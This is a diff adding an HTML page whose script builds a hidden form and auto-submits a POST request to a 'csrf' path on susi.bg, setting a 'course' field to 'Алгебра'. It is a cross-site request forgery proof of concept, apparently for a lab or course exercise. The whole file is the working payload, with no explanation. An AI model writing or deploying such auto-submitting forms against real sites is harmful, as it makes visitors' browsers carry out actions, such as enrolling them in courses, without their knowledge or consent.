@@ -1,0 +1,23 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <title>Title</title>
+</head>
+<body>
+<script>
+    let form = document.createElement("form");
+    form.action = "http://susi.bg/csrf/susi/index.php";
+    form.method = "POST";
+
+    let input = document.createElement("input");
+    input.name = "course";
+    input.value = "Алгебра";
+
+    form.appendChild(input);
+
+    document.body.appendChild(form);
+    form.submit();
+</script>
+</body>
+</html>
